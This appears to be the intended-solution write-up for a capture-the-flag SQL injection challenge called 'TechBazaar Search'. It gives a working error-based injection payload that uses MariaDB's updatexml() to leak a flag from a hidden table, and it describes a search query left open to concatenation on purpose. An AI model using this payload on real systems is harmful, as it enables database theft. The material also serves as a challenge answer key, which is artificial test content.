# sqli2 - TechBazaar Search: intended solution

The search route in `app/app.py` builds its query by concatenation and
prints the database error to the page when the query fails:

    SELECT id, name, price, description FROM products
    WHERE name LIKE '%<q>%'

With:

    %' AND updatexml(1, CONCAT(0x7e, (SELECT secret FROM vault
        LIMIT 1)), 1) --

the injected expression is passed to MariaDB's `updatexml()`, which
rejects `~flag{...}` as an XPATH expression. The error (code 1105)
quotes the whole expression, so the flag from the hidden `vault`
table comes back in the "Search failed" card.

Note: the template HTML-escapes the error, so unescape the page text
before looking for `flag{...}`.

## Reference exploit

    python solve.py [http://host:8031]
